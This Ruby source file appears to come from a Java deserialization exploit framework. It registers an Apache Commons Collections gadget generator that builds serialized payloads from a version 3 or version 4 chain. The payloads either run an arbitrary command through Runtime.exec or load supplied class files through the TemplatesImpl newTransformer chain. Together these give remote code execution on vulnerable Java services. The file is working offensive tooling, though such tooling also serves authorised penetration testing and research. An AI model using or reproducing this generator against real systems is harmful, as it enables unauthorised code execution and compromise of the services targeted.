# -*- coding: binary -*-
require_relative '../../payloads/collections'
require_relative '../../payloads/templates'

S=Rex::Java::Serialization 
class Collections < S::Generator::Gadget
  def id
    'collections'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('collections')

    unless params.fetch('classfiles', nil).nil?
      return false unless S::Generator::Templates.supported(ctx,params)
    end

    true
  end

  def create(ctx, params: {})
    ver = 3
    if ctx.flag?('collections4') || 
        ctx.class?('org.apache.commons.collections4.functors.InvokerTransformer')
      ver = 4
      ctx.reg.load('model/collections-4.json')
    else
      ctx.reg.load('model/collections-3.json')
    end

    if !params.fetch('cmd', nil).nil?
      S::Payloads::Collections.make_runtime_exec(params['cmd'], ver = ver)
    elsif !params.fetch('classfiles', nil).nil?
      S::Payloads::Collections.make_invoke_noarg(
        S::Payloads::Templates.make(ctx,params), 
        'newTransformer', 
        ver = ver)
    else
      raise 'Missing parameters'
    end
  end
end

S::Generator.register(
  Collections.new
)
